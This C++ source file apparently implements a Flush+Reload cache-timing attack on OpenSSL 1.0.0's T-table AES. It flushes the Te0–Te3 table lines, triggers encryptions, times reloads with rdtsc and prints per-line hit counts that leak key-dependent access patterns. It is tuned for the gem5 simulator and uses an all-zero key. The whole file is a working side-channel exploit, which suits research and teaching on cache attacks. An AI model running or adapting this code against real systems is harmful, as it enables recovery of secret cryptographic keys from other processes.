#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
// #include <openssl/aes.h>
#include "openssl-1.0.0/include/openssl/aes.h"
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
// #define MIN_CACHE_MISS_CYCLES (160)
#define MIN_CACHE_MISS_CYCLES (100) // good for gem5

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

int main()
{
//   int fd = open("./openssl-1.0.0/libcrypto.so", O_RDONLY);
//   size_t size = lseek(fd, 0, SEEK_END);
//   if (size == 0)
//     exit(-1);
//   size_t map_size = size;
//   if (map_size & 0xFFF != 0)
//   {
//     map_size |= 0xFFF;
//     map_size += 1;
//   }
//   base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
//   end = base + size;
  extern const uint32_t Te0[256];
  extern const uint32_t Te3[256];
  printf("Te0 address: %p\n", Te0);
  printf("Te3 address: %p\n", Te3);
  char* te0 = (char*)Te0;
  char* te3 = (char*)Te3;
  
  // printf("Try flushing Te0\n");
  // flush(&te0[0]);
  // printf("Finish flushing Te0\n");

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];
  
  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;

  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;
    // plaintext[1] = byte;
    // plaintext[2] = byte;
    // plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    // adjust me (decreasing order)
    // int te0 = 0x197720;
    // int te1 = 0x197320;
    // int te2 = 0x196f20;
    // int te3 = 0x196b20;

    //adjust address range to exclude unwanted lines/tables
    for (probe = te0; probe < te3 + 64*16; probe += 64) // hardcoded addresses (could be done dynamically)
    {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        for (size_t j = 0; j < 16; ++j) {
          if(j != 0) {
            plaintext[j] = rand() % 256;
          }
        }
        flush(probe);
        AES_encrypt(plaintext, ciphertext, &key_struct);
        // sched_yield();
        size_t time = rdtsc();
        maccess(probe);
        size_t delta = rdtsc() - time;
        // printf("delta: %lu\n", delta);
        if (delta < MIN_CACHE_MISS_CYCLES)
          ++count;
      }
      // sched_yield();
      timings[probe][byte] = count;
      // sched_yield();
    }
  }

  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%6lu", kit.second);
    }
    printf("\n");
  }

//   close(fd);
//   munmap(base, map_size);
  fflush(stdout);
  return 0;
}